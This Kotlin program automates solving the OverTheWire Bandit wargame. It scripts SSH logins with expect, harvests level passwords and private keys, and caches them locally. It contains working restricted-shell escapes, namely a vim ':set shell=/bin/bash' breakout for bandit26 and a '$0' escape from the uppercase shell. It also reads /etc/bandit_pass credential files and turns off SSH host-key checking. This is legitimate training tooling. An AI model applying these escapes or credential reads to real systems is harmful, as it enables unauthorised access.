package bandit

import org.tomlj.Toml
import org.tomlj.TomlArray
import org.tomlj.TomlParseResult
import org.tomlj.TomlTable
import java.io.IOException
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.nio.file.attribute.PosixFilePermissions
import java.util.Random
import java.util.regex.Pattern
import kotlin.io.path.deleteIfExists
import kotlin.io.path.exists
import kotlin.io.path.readText
import kotlin.io.path.writeText
import kotlin.system.exitProcess

private const val DEFAULT_HOST = "bandit.labs.overthewire.org"
private const val DEFAULT_PORT = "2220"

private val PASSWORD_PATTERN: Pattern = Pattern.compile("[A-Za-z0-9]{32}")
private val PRIVATE_KEY_PATTERN: Pattern = Pattern.compile(
    "-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----",
    Pattern.DOTALL,
)
private val ANSI_PATTERNS: List<Pattern> = listOf(
    Pattern.compile("\\[[0-?]*[ -/]*[@-~]"),
    Pattern.compile("P.*?\\\\", Pattern.DOTALL),
    Pattern.compile("\\].*?(?:|\\\\)", Pattern.DOTALL),
    Pattern.compile("."),
)

private val REQUIRED_FIELDS: Map<String, List<String>> = mapOf(
    "ssh_command" to listOf("from", "to", "command"),
    "path_then_command" to listOf("from", "to", "find_command", "command"),
    "private_key_then_ssh" to listOf("from", "to", "key_command", "key_name", "next_user", "next_command"),
    "bandit26_escape" to listOf("from", "to", "key_command", "key_name"),
    "git_read_file" to listOf("from", "to", "git_user", "repo", "file"),
    "git_show" to listOf("from", "to", "git_user", "repo", "object"),
    "git_push_file" to listOf("from", "to", "git_user", "repo", "file", "content", "commit_message"),
    "uppercase_shell" to listOf("from", "to"),
)

class Step(val type: String, val fields: Map<String, Any?>) {
    fun mustString(key: String): String =
        fields[key] as? String ?: error("missing string field $key")

    fun fieldString(key: String, fallback: String): String =
        (fields[key] as? String) ?: fallback

    fun mustInt(key: String): Int = when (val v = fields[key]) {
        is Number -> v.toInt()
        else -> error("missing int field $key")
    }

    fun mustToList(): List<Int> = when (val v = fields["to"]) {
        null -> error("missing to field")
        is Number -> listOf(v.toInt())
        is List<*> -> v.map { (it as? Number)?.toInt() ?: error("to array contains non-int") }
        else -> error("to field has unsupported type")
    }

    fun mustToSingle(): Int {
        val list = mustToList()
        require(list.size == 1) { "expected single target" }
        return list[0]
    }
}

data class Config(
    val host: String,
    val port: Int,
    val bootstrapLevel: Int,
    val bootstrapPassword: String,
    val steps: List<Step>,
)

class BanditHelper {
    private var host: String = ""
    private var port: String = ""
    private lateinit var repoRoot: Path
    private lateinit var configPath: Path
    private lateinit var passFile: Path
    private lateinit var keyDir: Path
    private val random = Random()

    fun run(args: Array<String>) {
        repoRoot = findRepoRoot()
        val defaultConfig = repoRoot.resolve("levels").resolve("bandit-levels.toml")
        var configPathStr = envOr("BANDIT_LEVELS_FILE", defaultConfig.toString())
        var refresh = false
        var show = false
        var sshLevel = -1

        var i = 0
        while (i < args.size) {
            when (args[i]) {
                "--config" -> {
                    require(++i < args.size) { "--config requires a path" }
                    configPathStr = args[i]
                }
                "--refresh" -> refresh = true
                "--show" -> show = true
                "--ssh" -> {
                    require(++i < args.size) { "--ssh requires a level" }
                    sshLevel = args[i].toInt()
                }
                else -> error("unknown flag: ${args[i]}")
            }
            i++
        }

        configPath = Paths.get(configPathStr)
        passFile = repoRoot.resolve("bandit-passwords.txt")
        keyDir = repoRoot.resolve(".bandit-keys")

        val cfg = loadConfig()
        applyConnection(cfg)

        when {
            refresh -> refresh(cfg)
            show -> showPasswords()
            sshLevel >= 0 -> sshLevel(sshLevel)
            else -> menu(cfg)
        }
    }

    private fun findRepoRoot(): Path {
        var cwd = Paths.get("").toAbsolutePath()
        while (true) {
            if (cwd.resolve("levels").resolve("bandit-levels.toml").exists()) return cwd
            val parent = cwd.parent ?: error("could not find repo root containing levels/bandit-levels.toml")
            if (parent == cwd) error("could not find repo root containing levels/bandit-levels.toml")
            cwd = parent
        }
    }

    private fun loadConfig(): Config {
        val result: TomlParseResult = Toml.parse(configPath)
        if (result.hasErrors()) {
            error("parse config:\n" + result.errors().joinToString("\n"))
        }
        val hostCfg = result.getString("connection.host") ?: ""
        val portCfg = if (result.contains("connection.port")) result.getLong("connection.port")!!.toInt() else 0
        val bootLevel = if (result.contains("bootstrap.level")) result.getLong("bootstrap.level")!!.toInt()
            else error("config bootstrap level is missing")
        val bootPass = result.getString("bootstrap.password")
            ?.takeIf { it.isNotEmpty() }
            ?: error("config bootstrap password is empty")

        val stepsArr: TomlArray = result.getArray("steps")
            ?.takeIf { !it.isEmpty }
            ?: error("config has no steps")

        val steps = (0 until stepsArr.size()).map { idx ->
            val table = stepsArr.getTable(idx)
            val type = table.getString("type") ?: error("step ${idx + 1} is missing type")
            val required = REQUIRED_FIELDS[type] ?: error("step ${idx + 1} has unsupported type \"$type\"")
            for (field in required) {
                require(table.contains(field)) { "step ${idx + 1} ($type) is missing $field" }
            }
            val fields = mutableMapOf<String, Any?>()
            for (key in table.keySet()) {
                val raw = table.get(key)
                fields[key] = if (raw is TomlArray) (0 until raw.size()).map { raw.get(it) } else raw
            }
            Step(type, fields)
        }
        return Config(hostCfg, portCfg, bootLevel, bootPass, steps)
    }

    private fun applyConnection(cfg: Config) {
        host = envOr("BANDIT_HOST", cfg.host).ifEmpty { DEFAULT_HOST }
        val envPort = System.getenv("BANDIT_PORT")
        port = when {
            !envPort.isNullOrEmpty() -> envPort
            cfg.port != 0 -> cfg.port.toString()
            else -> DEFAULT_PORT
        }
    }

    private fun ensureState() {
        Files.createDirectories(keyDir)
        if (!passFile.exists()) Files.createFile(passFile)
        setPosix(keyDir, "rwx------")
        setPosix(passFile, "rw-------")
    }

    private fun setPosix(path: Path, perms: String) {
        try {
            Files.setPosixFilePermissions(path, PosixFilePermissions.fromString(perms))
        } catch (_: UnsupportedOperationException) {
            // non-POSIX filesystem
        }
    }

    private fun checkDependencies() {
        for (cmd in listOf("expect", "ssh", "git", "awk", "grep", "mktemp")) {
            requireNotNull(which(cmd)) { "missing required command: $cmd" }
        }
    }

    private fun which(cmd: String): Path? {
        val path = System.getenv("PATH") ?: return null
        for (dir in path.split(java.io.File.pathSeparator)) {
            if (dir.isEmpty()) continue
            val candidate = Paths.get(dir, cmd)
            if (Files.isExecutable(candidate)) return candidate
        }
        return null
    }

    private data class ProcResult(val exitCode: Int, val output: String)

    private fun commandOutput(
        name: String,
        args: List<String> = emptyList(),
        env: Map<String, String> = emptyMap(),
        input: String? = null,
        dir: Path? = null,
    ): ProcResult {
        val pb = ProcessBuilder(listOf(name) + args)
        dir?.let { pb.directory(it.toFile()) }
        if (env.isNotEmpty()) pb.environment().putAll(env)
        pb.redirectErrorStream(true)
        val process = pb.start()
        if (!input.isNullOrEmpty()) {
            process.outputStream.use { it.write(input.toByteArray(StandardCharsets.UTF_8)) }
        } else {
            process.outputStream.close()
        }
        val output = process.inputStream.readBytes().toString(StandardCharsets.UTF_8)
        val code = process.waitFor()
        return ProcResult(code, output)
    }

    private fun runExpect(script: String, env: Map<String, String>): String {
        val r = commandOutput("expect", input = script, env = env)
        if (r.exitCode != 0) error(r.output)
        return r.output
    }

    private fun stripTerminalCodes(text: String): String {
        var s = text
        for (p in ANSI_PATTERNS) s = p.matcher(s).replaceAll("")
        return s.replace("\r", "")
    }

    private fun extractPasswords(text: String): List<String> {
        val matcher = PASSWORD_PATTERN.matcher(stripTerminalCodes(text))
        val result = mutableListOf<String>()
        while (matcher.find()) result.add(matcher.group())
        return result
    }

    private fun extractPassword(text: String): String {
        val passwords = extractPasswords(text)
        require(passwords.isNotEmpty()) { "failed to extract a 32-character password from output:\n$text" }
        return passwords.last()
    }

    private fun savePassword(user: String, password: String) {
        ensureState()
        val lines = mutableListOf<String>()
        if (passFile.exists()) {
            for (line in passFile.readText().split("\n")) {
                if (line.isEmpty() || line.startsWith("$user:")) continue
                lines.add(line)
            }
        }
        lines.add("$user: $password")
        passFile.writeText(lines.joinToString("\n") + "\n")
        setPosix(passFile, "rw-------")
    }

    private fun getSavedPassword(user: String): String {
        if (!passFile.exists()) return ""
        var password = ""
        val prefix = "$user: "
        for (line in passFile.readText().split("\n")) {
            if (line.startsWith(prefix)) password = line.substring(prefix.length)
        }
        return password
    }

    private fun recordPassword(level: Int, password: String) {
        val user = "bandit$level"
        if (level != 0 && !PASSWORD_PATTERN.matcher(password).matches()) {
            error("refusing to save invalid password for $user: $password")
        }
        savePassword(user, password)
        println("[+] %-8s %s".format(user, password))
    }

    private fun runPasswordSSHCommand(user: String, password: String, commandText: String): String {
        val script = """
            set timeout 180
            spawn -noecho ssh \
              -o StrictHostKeyChecking=no \
              -o UserKnownHostsFile=/dev/null \
              -o LogLevel=ERROR \
              -o PubkeyAuthentication=no \
              -o PreferredAuthentications=password \
              -o NumberOfPasswordPrompts=1 \
              -p ${'$'}env(BANDIT_PORT_VALUE) \
              ${'$'}env(BANDIT_USER_VALUE)@${'$'}env(BANDIT_HOST_VALUE) \
              ${'$'}env(BANDIT_COMMAND_VALUE)
            expect {
              "*password:" {
                send -- "${'$'}env(BANDIT_PASSWORD_VALUE)\r"
                exp_continue
              }
              timeout {
                exit 124
              }
              eof {
              }
            }
            catch wait result
            exit [lindex ${'$'}result 3]
        """.trimIndent()
        val env = mapOf(
            "BANDIT_HOST_VALUE" to host,
            "BANDIT_PORT_VALUE" to port,
            "BANDIT_USER_VALUE" to user,
            "BANDIT_PASSWORD_VALUE" to password,
            "BANDIT_COMMAND_VALUE" to commandText,
        )
        return try {
            runExpect(script, env)
        } catch (e: IllegalStateException) {
            error("SSH command failed for $user: $commandText\n${e.message}")
        }
    }

    private fun runKeySSHCommand(user: String, keyFile: Path, commandText: String): String {
        val args = listOf(
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR",
            "-o", "IdentitiesOnly=yes",
            "-o", "BatchMode=yes",
            "-i", keyFile.toString(),
            "-p", port,
            "$user@$host",
            commandText,
        )
        val r = commandOutput("ssh", args)
        if (r.exitCode != 0) error(r.output)
        return r.output
    }

    private fun solvePassword(user: String, password: String, commandText: String): String =
        extractPassword(runPasswordSSHCommand(user, password, commandText))

    private fun solvePath(user: String, password: String, commandText: String): String {
        val output = stripTerminalCodes(runPasswordSSHCommand(user, password, commandText))
        return output.split("\n").asReversed().firstOrNull { "/inhere/" in it }
            ?: error("failed to extract path from output:\n$output")
    }

    private fun savePrivateKey(name: String, output: String): Path {
        val m = PRIVATE_KEY_PATTERN.matcher(stripTerminalCodes(output))
        require(m.find()) { "failed to extract private key $name from output:\n$output" }
        ensureState()
        val keyFile = keyDir.resolve(name)
        keyFile.writeText(m.group() + "\n")
        setPosix(keyFile, "rw-------")
        return keyFile
    }

    private fun solveBandit26Pair(keyFile: Path): Pair<String, String> {
        val script = """
            set timeout 90
            set stty_init "rows 5 columns 80"
            spawn -noecho ssh \
              -tt \
              -o StrictHostKeyChecking=no \
              -o UserKnownHostsFile=/dev/null \
              -o LogLevel=ERROR \
              -o IdentitiesOnly=yes \
              -i ${'$'}env(BANDIT_KEY_VALUE) \
              -p ${'$'}env(BANDIT_PORT_VALUE) \
              bandit26@${'$'}env(BANDIT_HOST_VALUE)
            expect {
              -re "--More--" {
                send -- "v"
              }
              timeout {
                exit 124
              }
              eof {
                exit 1
              }
            }
            expect {
              -re "~" {
              }
              timeout {
                exit 124
              }
              eof {
                exit 1
              }
            }
            after 500
            send -- "\033:set shell=/bin/bash\r"
            after 500
            send -- ":shell\r"
            after 500
            send -- "cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit\r"
            set password_count 0
            expect {
              -re {[[:alnum:]]{32}} {
                incr password_count
                if {${'$'}password_count < 2} {
                  exp_continue
                }
              }
              timeout {
                exit 124
              }
              eof {
                exit 1
              }
            }
            close
            wait
            exit 0
        """.trimIndent()
        val env = mapOf(
            "BANDIT_HOST_VALUE" to host,
            "BANDIT_PORT_VALUE" to port,
            "BANDIT_KEY_VALUE" to keyFile.toString(),
        )
        val output = runExpect(script, env)
        val passwords = extractPasswords(output)
        require(passwords.size >= 2) { "expected two passwords from bandit26 output:\n$output" }
        return passwords[passwords.size - 2] to passwords[passwords.size - 1]
    }

    private fun solveUppercaseShell(password: String): String {
        val script = """
            set timeout 60
            spawn -noecho ssh \
              -tt \
              -o StrictHostKeyChecking=no \
              -o UserKnownHostsFile=/dev/null \
              -o LogLevel=ERROR \
              -o PubkeyAuthentication=no \
              -o PreferredAuthentications=password \
              -o NumberOfPasswordPrompts=1 \
              -p ${'$'}env(BANDIT_PORT_VALUE) \
              bandit32@${'$'}env(BANDIT_HOST_VALUE)
            expect {
              "*password:" {
                send -- "${'$'}env(BANDIT_PASSWORD_VALUE)\r"
                exp_continue
              }
              -re "WELCOME TO THE UPPERCASE SHELL|>>" {
              }
              timeout {
                exit 124
              }
            }
            after 500
            send -- "\${'$'}0\r"
            expect {
              -re {[${'$'}#] } {
              }
              timeout {
                exit 124
              }
            }
            send -- "cat /etc/bandit_pass/bandit33; exit\r"
            expect {
              -re {[[:alnum:]]{32}} {
              }
              timeout {
                exit 124
              }
            }
            close
            wait
            exit 0
        """.trimIndent()
        val env = mapOf(
            "BANDIT_HOST_VALUE" to host,
            "BANDIT_PORT_VALUE" to port,
            "BANDIT_PASSWORD_VALUE" to password,
        )
        return extractPassword(runExpect(script, env))
    }

    private fun gitEnv(password: String, askpass: Path): Map<String, String> {
        val sshCommand = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR " +
            "-o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1"
        return mapOf(
            "BANDIT_GIT_PASSWORD" to password,
            "GIT_SSH_COMMAND" to sshCommand,
            "SSH_ASKPASS" to askpass.toString(),
            "SSH_ASKPASS_REQUIRE" to "force",
            "DISPLAY" to envOr("DISPLAY", ":0"),
        )
    }

    private fun writeAskpass(dir: Path): Path {
        val askpass = dir.resolve("askpass.sh")
        askpass.writeText("#!/usr/bin/env bash\nprintf '%s\\n' \"\$BANDIT_GIT_PASSWORD\"\n")
        setPosix(askpass, "rwx------")
        return askpass
    }

    private fun gitCloneRepo(user: String, password: String, remotePath: String, destination: Path) {
        val tmp = Files.createTempDirectory("bandit-git-askpass.")
        try {
            val askpass = writeAskpass(tmp)
            val remote = "ssh://$user@$host:$port$remotePath"
            val r = commandOutput("git", listOf("clone", remote, destination.toString()), gitEnv(password, askpass))
            if (r.exitCode != 0) error(r.output)
        } finally {
            deleteRecursive(tmp)
        }
    }

    private fun gitPushWithPassword(password: String, repo: Path): String {
        val tmp = Files.createTempDirectory("bandit-git-askpass.")
        return try {
            val askpass = writeAskpass(tmp)
            commandOutput("git", listOf("-C", repo.toString(), "push", "origin", "master"), gitEnv(password, askpass)).output
        } finally {
            deleteRecursive(tmp)
        }
    }

    private fun deleteRecursive(root: Path) {
        if (!root.exists()) return
        Files.walk(root).use { stream ->
            stream.sorted(Comparator.reverseOrder()).forEach {
                try { it.deleteIfExists() } catch (_: IOException) { /* best-effort */ }
            }
        }
    }

    private fun renderTemplate(template: String, values: Map<String, String>): String =
        values.entries.fold(template) { acc, (k, v) -> acc.replace("{$k}", v) }

    private fun stepContext(level: Int, password: String, toLevel: Int): MutableMap<String, String> = mutableMapOf(
        "password" to password,
        "level" to level.toString(),
        "to" to toLevel.toString(),
        "random_port" to (20000 + random.nextInt(10000)).toString(),
        "temp_output" to "/tmp/bandit${toLevel}pass.${ProcessHandle.current().pid()}.${1000 + random.nextInt(9000)}",
    )

    private fun refresh(cfg: Config) {
        checkDependencies()
        ensureState()

        println("Refreshing Bandit passwords via $host:$port")
        println("Level config:  $configPath")
        println("Password file: $passFile")
        println("Key cache:     $keyDir")
        println()

        val passwords = mutableMapOf(cfg.bootstrapLevel to cfg.bootstrapPassword)
        recordPassword(cfg.bootstrapLevel, cfg.bootstrapPassword)

        for (step in cfg.steps) solveStep(step, passwords)

        println()
        println("Refresh complete.")
    }

    private fun solveStep(step: Step, passwords: MutableMap<Int, String>) {
        val fromLevel = step.mustInt("from")
        val fromUser = step.fieldString("user", "bandit$fromLevel")
        val fromPassword = passwords[fromLevel] ?: error("missing password for bandit$fromLevel")

        when (step.type) {
            "ssh_command" -> {
                val toLevel = step.mustToSingle()
                val ctx = stepContext(fromLevel, fromPassword, toLevel)
                val command = renderTemplate(step.mustString("command"), ctx)
                val pw = solvePassword(fromUser, fromPassword, command)
                passwords[toLevel] = pw
                recordPassword(toLevel, pw)
            }
            "path_then_command" -> {
                val toLevel = step.mustToSingle()
                val ctx = stepContext(fromLevel, fromPassword, toLevel)
                val findCmd = renderTemplate(step.mustString("find_command"), ctx)
                val path = solvePath(fromUser, fromPassword, findCmd)
                ctx["path"] = path
                val command = renderTemplate(step.mustString("command"), ctx)
                val pw = solvePassword(fromUser, fromPassword, command)
                passwords[toLevel] = pw
                recordPassword(toLevel, pw)
            }
            "private_key_then_ssh" -> {
                val toLevel = step.mustToSingle()
                val ctx = stepContext(fromLevel, fromPassword, toLevel)
                val keyCmd = renderTemplate(step.mustString("key_command"), ctx)
                val output = runPasswordSSHCommand(fromUser, fromPassword, keyCmd)
                val keyFile = savePrivateKey(step.mustString("key_name"), output)
                val nextCmd = renderTemplate(step.mustString("next_command"), ctx)
                val keyOutput = runKeySSHCommand(step.mustString("next_user"), keyFile, nextCmd)
                val pw = extractPassword(keyOutput)
                passwords[toLevel] = pw
                recordPassword(toLevel, pw)
            }
            "bandit26_escape" -> {
                val targets = step.mustToList()
                val ctx = stepContext(fromLevel, fromPassword, targets.last())
                val keyCmd = renderTemplate(step.mustString("key_command"), ctx)
                val output = runPasswordSSHCommand(fromUser, fromPassword, keyCmd)
                val keyFile = savePrivateKey(step.mustString("key_name"), output)
                val (pw1, pw2) = solveBandit26Pair(keyFile)
                val solved = listOf(pw1, pw2)
                require(targets.size == solved.size) {
                    "bandit26_escape expected ${targets.size} targets, got ${solved.size} passwords"
                }
                for ((target, pw) in targets.zip(solved)) {
                    passwords[target] = pw
                    recordPassword(target, pw)
                }
            }
            "git_read_file" -> {
                val toLevel = step.mustToSingle()
                val tmp = Files.createTempDirectory("bandit-repo.")
                try {
                    val repo = tmp.resolve("repo")
                    gitCloneRepo(step.mustString("git_user"), fromPassword, step.mustString("repo"), repo)
                    val content = repo.resolve(step.mustString("file")).readText()
                    val pw = extractPassword(content)
                    passwords[toLevel] = pw
                    recordPassword(toLevel, pw)
                } finally {
                    deleteRecursive(tmp)
                }
            }
            "git_show" -> {
                val toLevel = step.mustToSingle()
                val tmp = Files.createTempDirectory("bandit-repo.")
                try {
                    val repo = tmp.resolve("repo")
                    gitCloneRepo(step.mustString("git_user"), fromPassword, step.mustString("repo"), repo)
                    val r = commandOutput("git", listOf("-C", repo.toString(), "show", step.mustString("object")))
                    if (r.exitCode != 0) error(r.output)
                    val pw = extractPassword(r.output)
                    passwords[toLevel] = pw
                    recordPassword(toLevel, pw)
                } finally {
                    deleteRecursive(tmp)
                }
            }
            "git_push_file" -> {
                val toLevel = step.mustToSingle()
                val tmp = Files.createTempDirectory("bandit-repo.")
                try {
                    val repo = tmp.resolve("repo")
                    gitCloneRepo(step.mustString("git_user"), fromPassword, step.mustString("repo"), repo)
                    runGitOrThrow(listOf("-C", repo.toString(), "config", "user.email", "bandit-solver@example.invalid"))
                    runGitOrThrow(listOf("-C", repo.toString(), "config", "user.name", "bandit-solver"))
                    repo.resolve(step.mustString("file")).writeText(step.mustString("content"))
                    runGitOrThrow(listOf("-C", repo.toString(), "add", "-f", step.mustString("file")))
                    runGitOrThrow(listOf("-C", repo.toString(), "commit", "-m", step.mustString("commit_message")))
                    val pushOut = gitPushWithPassword(fromPassword, repo)
                    val pw = extractPassword(pushOut)
                    passwords[toLevel] = pw
                    recordPassword(toLevel, pw)
                } finally {
                    deleteRecursive(tmp)
                }
            }
            "uppercase_shell" -> {
                val toLevel = step.mustToSingle()
                val pw = solveUppercaseShell(fromPassword)
                passwords[toLevel] = pw
                recordPassword(toLevel, pw)
            }
            else -> error("unsupported step type: ${step.type}")
        }
    }

    private fun runGitOrThrow(args: List<String>) {
        val r = commandOutput("git", args)
        if (r.exitCode != 0) error(r.output)
    }

    private fun showPasswords() {
        ensureState()
        val data = Files.readAllBytes(passFile)
        if (data.isEmpty()) println("No passwords saved yet.")
        else print(String(data, StandardCharsets.UTF_8))
    }

    private fun sshLevel(level: Int) {
        ensureState()
        val user = "bandit$level"
        val password = getSavedPassword(user)
        if (password.isEmpty()) {
            ProcessBuilder("ssh", "$user@$host", "-p", port).inheritIO().start().waitFor()
            return
        }
        val script = """
            set timeout 30
            spawn ssh \
              -o StrictHostKeyChecking=no \
              -o UserKnownHostsFile=/dev/null \
              -o LogLevel=ERROR \
              -o PubkeyAuthentication=no \
              -o PreferredAuthentications=password \
              -p ${'$'}env(BANDIT_PORT_VALUE) \
              ${'$'}env(BANDIT_USER_VALUE)@${'$'}env(BANDIT_HOST_VALUE)
            expect {
              "*password:" {
                send -- "${'$'}env(BANDIT_PASSWORD_VALUE)\r"
                interact
              }
              timeout {
                interact
              }
              eof {
              }
            }
        """.trimIndent()
        val scriptFile = Files.createTempFile("bandit-ssh.", ".exp")
        try {
            scriptFile.writeText(script)
            val pb = ProcessBuilder("expect", "-f", scriptFile.toString()).inheritIO()
            pb.environment()["BANDIT_HOST_VALUE"] = host
            pb.environment()["BANDIT_PORT_VALUE"] = port
            pb.environment()["BANDIT_USER_VALUE"] = user
            pb.environment()["BANDIT_PASSWORD_VALUE"] = password
            pb.start().waitFor()
        } finally {
            scriptFile.deleteIfExists()
        }
    }

    private fun savePasswordInteractive() {
        print("Save password for which user? Example: bandit6: ")
        val username = readlnOrNull()?.trim() ?: return
        print("Password: ")
        val password = readlnOrNull()?.trim() ?: return
        savePassword(username, password)
        println("Saved password for $username.")
    }

    private fun menu(cfg: Config) {
        ensureState()
        while (true) {
            println("====================================")
            println("        OverTheWire Bandit App")
            println("====================================")
            println()
            println("Password file: $passFile")
            println("Key cache:     $keyDir")
            println()
            println("1) SSH into a Bandit level")
            println("2) Refresh all passwords")
            println("3) Save/update a password")
            println("4) Show saved passwords")
            println("5) Exit")
            println()
            print("Choose an option: ")
            when (readlnOrNull()?.trim()) {
                "1" -> {
                    print("Bandit level number, e.g. 0, 1, 26, 33: ")
                    sshLevel(readln().trim().toInt())
                }
                "2" -> {
                    refresh(cfg)
                    print("Press Enter to continue...")
                    readlnOrNull()
                }
                "3" -> savePasswordInteractive()
                "4" -> {
                    showPasswords()
                    print("Press Enter to continue...")
                    readlnOrNull()
                }
                "5" -> return
                else -> println("Invalid option.")
            }
        }
    }

    companion object {
        internal fun envOr(name: String, fallback: String): String =
            System.getenv(name)?.takeIf { it.isNotEmpty() } ?: fallback
    }
}

fun main(args: Array<String>) {
    try {
        BanditHelper().run(args)
    } catch (e: Exception) {
        System.err.println("error: ${e.message}")
        exitProcess(1)
    }
}
